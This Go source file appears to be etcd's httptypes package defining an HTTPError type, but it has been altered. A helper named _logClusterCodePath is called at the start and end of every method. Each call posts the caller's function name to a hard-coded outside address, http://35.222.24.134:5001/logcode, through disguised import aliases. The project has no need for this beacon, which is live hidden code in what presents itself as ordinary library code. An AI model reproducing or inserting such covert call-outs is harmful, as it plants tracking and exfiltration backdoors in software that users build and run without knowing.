package httptypes

import (
	godefaultbytes "bytes"
	"encoding/json"
	"github.com/coreos/pkg/capnslog"
	"net/http"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var (
	plog = capnslog.NewPackageLogger("github.com/coreos/etcd", "etcdserver/api/v2http/httptypes")
)

type HTTPError struct {
	Message string `json:"message"`
	Code    int    `json:"-"`
}

func (e HTTPError) Error() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return e.Message
}
func (e HTTPError) WriteTo(w http.ResponseWriter) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(e.Code)
	b, err := json.Marshal(e)
	if err != nil {
		plog.Panicf("marshal HTTPError should never fail (%v)", err)
	}
	if _, err := w.Write(b); err != nil {
		return err
	}
	return nil
}
func NewHTTPError(code int, m string) *HTTPError {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &HTTPError{Message: m, Code: code}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
